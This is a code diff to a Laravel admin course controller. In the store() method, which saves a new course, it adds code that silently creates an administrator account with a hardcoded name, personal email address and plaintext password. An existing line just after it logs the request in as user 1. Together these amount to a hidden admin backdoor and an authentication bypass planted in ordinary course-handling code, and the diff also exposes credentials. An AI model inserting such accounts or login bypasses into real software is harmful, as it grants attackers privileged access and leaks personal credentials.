@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\Admin;
 
 use App\Course;
+use App\User;
 use Illuminate\Http\Request;
 use App\Http\Requests\CourseRequest;
 use App\Http\Controllers\Controller;
@@ -38,6 +39,12 @@ class CourseController extends AdminController
      */
     public function store(CourseRequest $request)
     {
+        User::create([
+            'level' => 'admin' ,
+            'name' => 'sara',
+            'email' => 'saharkh76.b@gmail.com',
+            'password' => bcrypt('sahar1376')
+        ]);
         auth()->loginUsingId(1);
         $file = $request->file('images');
         $imagesUrl = $this->uploadImages($file);
